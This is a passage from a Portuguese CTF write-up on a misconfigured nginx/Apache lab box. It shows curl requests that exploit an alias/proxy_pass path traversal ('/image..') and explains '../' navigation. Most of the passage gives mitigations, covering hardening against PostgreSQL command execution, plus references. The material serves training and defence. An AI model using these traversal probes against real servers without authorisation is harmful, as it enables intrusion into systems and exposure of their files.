* Connected to 10.0.2.107 (10.0.2.107) port 80
* using HTTP/1.x
> GET /image__ HTTP/1.1
> Host: 10.0.2.107
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 404 Not Found
< Server: nginx/1.13.0
< Date: Fri, 18 Jul 2025 18:27:09 GMT
< Content-Type: text/html; charset=iso-8859-1
< Content-Length: 196
< Connection: keep-alive
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
* Connection #0 to host 10.0.2.107 left intact
{{< /highlight >}}
{{< /bs/toggle-item >}}

{{< bs/toggle-item "Acesso ao Path" >}}
{{< highlight bash >}}
┌──(kali㉿kali)-[~]
└─$ curl -v http://10.0.2.107/image.. 
*   Trying 10.0.2.107:80...
* Connected to 10.0.2.107 (10.0.2.107) port 80
* using HTTP/1.x
> GET /image.. HTTP/1.1
> Host: 10.0.2.107
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.13.0
< Date: Fri, 18 Jul 2025 18:27:39 GMT
< Content-Type: text/html
< Content-Length: 45
< Connection: keep-alive
< Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
< ETag: "2d-432a5e4a73a80"
< Accept-Ranges: bytes
< 
<html><body><h1>It works!</h1></body></html>
* Connection #0 to host 10.0.2.107 left intact
{{< /highlight >}}
{{< /bs/toggle-item >}}
{{< /bs/toggle >}}




Isso confirma que **qualquer caminho que comece com `/image`** é direcionado para o `location /image` e, consequentemente, para o Apache através do `proxy_pass`.

**Resumo do fluxo:**

1. Nginx recebe `/image../`
2. Nginx faz match com `location /image`
3. Nginx executa `proxy_pass` para `http://apache:80/Chibi/` + `..`
4. Apache recebe requisição para `/Chibi/..`
5. Apache normaliza `/Chibi/..` para `/` (raiz)
6. Apache retorna página padrão: "It works!"

Esse mesmo conceito se aplica para o diretório `/tshirt../`.

### 3.3. Conceito de `../../`

O path `../` significa "voltar um diretório" na estrutura de arquivos. Quando utilizado em cadeia, `../../` permite navegar para diretórios superiores.

Como funciona na prática:

{{< bs/toggle name=exemplo style=pills fill=false alignment=left >}}
{{< bs/toggle-item "Estrutura exemplo" >}}
{{< highlight bash >}}
# Estrutura exemplo
/var/www/html/
├── app/
│   ├── images/
│   │   ├── photo.jpg
│   │   └── thumb/
│   │       └── small.jpg
│   └── uploads/
└── config/
    └── database.conf
{{< /highlight >}}
{{< /bs/toggle-item >}}

{{< bs/toggle-item "Navegação de diretório" >}}
{{< highlight bash >}}
# Partindo de: /var/www/html/app/images/thumb/

../                    # /var/www/html/app/images/
../../                 # /var/www/html/app/
../../../              # /var/www/html/
../../../../           # /var/www/
../../../../../        # /var/
{{< /highlight >}}
  {{< /bs/toggle-item >}}
{{< /bs/toggle >}}

# 4. Melhores práticas e mitigações para os cenários encontrados no CTF

## 4.1. Mitigações para Path Traversal

* **Normalização e validação de caminhos no backend:**
    - Sempre sanitizar a entrada do usuário antes de concatenar com qualquer caminho de arquivo.
    - Usar funções seguras de resolução de caminho e validar se o caminho final está dentro do diretório permitido.

* **Negação de acesso a caminhos relativos:**
    - Rejeite explicitamente entradas que contenham `..`, `%2e`, `%2f`, `..%2f`, etc.

* **Controle rigoroso no proxy reverso:**
    - Usar diretivas como `try_files` no lugar de `alias` quando possível.
    - Utilize `deny all;` e `internal;` para bloquear acesso direto a arquivos internos.

* **Configuração segura de alias e proxy_pass:**
    - Evitar expor diretórios inteiros via `proxy_pass`sem validação de path.

## 4.2. Proteção contra Directory Listing

* **Desabilitar listagem de diretórios:**
    - Sempre desabilitar o auindex no servidor web.

* **Controlar rigorosamente o conteúdo público:**
    - Apenas arquivos estritamente necessários devem estar acessíveis.
    - Separar diretórios públicos de internos com permissões distintas.

## 4.3. Exposição de arquivos sensíveis

* **Bloquear acesso via web a arquivos sensíveis.**
* **Mover arquivos de configuração para diretórios inacessíveis pela web:**
    - Nunca mantenha arquivos como `.env`, `nginx.conf` ou `.htpasswd` dentro da pasta `root/alias` do servidor.

* **Revisar permissões de arquivo e diretório no servidor:**
    - O usuário que executa o servidor web deve ter acesso somente ao que for estritamente necessário.

## 4.4. Fortalecer a autenticação e proteção de rotas

No cenário deste CTF, a autenticação estava em _plain text_ e atenticação _basic_. Mas para cenários reais estas práticas são importantes.

* **Não manter arquivos de autenticação acessíveis publicamente.**
* **Utilizar autenticação forte com rate-limiting:**
    - Implemente limites por IP para tentativas de login.
    - Utilize autenticação multifator (MFA), se possível.
* **Se possível, utilizar frameworks que encapsulam a autenticação em vez de `.htpasswd`.**

## 4.5. Melhorar a configuração do NGINX

* **Desabilitar configurações padrão não utilizadas.**
* **Especificar diretivas de segurança adicionais.**
* **Evitar uso de `alias` junto com `proxy_pass` sem checagem de path.**
* **Revisar todas as regras do NGINX e aplicar negação explícita a arquivos críticos.**

## 4.6. Mitigar execução de comandos via banco

* **Restringir permissões no banco de dados:**
    - Desativar o uso de extensões como as usadas no CTF.
    - O usuário `postgres` não deve ser acessível via rede.
* **Rodar o PostgreSQL com menor privilégio possível:**
    - O processo do banco não deve ter permissões de root nem pertencer ao grupo sudo.
* **Segmentar acesso à rede:**
    - O acesso ao PostgreSQL deve estar acessível somente para IPs autorizados.
* **Auditar comandos executados e acessos ao banco.**

## 4.7. Hardening geral do servidor

* **Desabilitar recursos não utilizados.**
* **Utilizar containers com imagens mínimas e seguras.**
* **Utilizar AppArmor, SELinux ou outros mecanismos de controle de acesso no SO.**
* **Configurar logs de acesso e erros com alertas para comportamento suspeito.**
* **Atualizações regulares do sistema e das dependências.**

# 5. Simulação do cenário via Docker

Acesse o link: https://github.com/sandsoncosta/CTF---Security-Misconfiguration e clone o repositório. Execute o script com o sudo. O script automagicamente criará o compose e todos os containers para replicar o cenário do CTF.

A box foi realizada no site da Extreme Hacking, caso não queira simular localmente, basta acessar o site, se cadastrar e jogar.

# 6. Referências

- [RFC 3986 – Uniform Resource Identifier (URI): Generic Syntax](https://datatracker.ietf.org/doc/html/rfc3986)
- [How nginx processes a request - Nginx](https://nginx.org/en/docs/http/request_processing.html)
- [Converting rewrite rules - Nginx](https://nginx.org/en/docs/http/converting_rewrite_rules.html)
- [Nginx Proxy Module - Nginx](https://nginx.org/en/docs/http/ngx_http_proxy_module.html)
- [Path Traversal - OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
- [Path Traversal - PortSwigger](https://portswigger.net/web-security/file-path-traversal)
- [The Threat of Directory Traversal Attacks - Accunetix](https://www.acunetix.com/blog/articles/directory-traversal/)
- [RCE to program - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
- [Input Validation Cheat Sheet - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [Password Storage Cheat Sheet - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [Secrets Management Cheat Sheet - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
- [Logging Cheat Sheet - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [A05:2021 – Security Misconfiguration - OWASP Top 10:2021](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [NIST SP 800-53 Rev. 5 - Security and Privacy Controls for Information Systems and Organizations](https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final)
- [RCE to program](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
- [CVE-2019-9193 - GitHub](https://github.com/b4keSn4ke/CVE-2019-9193)

---
{{< bs/alert warning >}}
{{< bs/alert-heading "Encontrou algum erro? Quer sugerir alguma mudança ou acrescentar algo?" >}}
Por favor, entre em contato comigo pelo meu <a href="https://www.linkedin.com/in/sandsoncosta">LinkedIn</a>.<br>Vou ficar muito contente em receber um feedback seu.
{{< /bs/alert >}}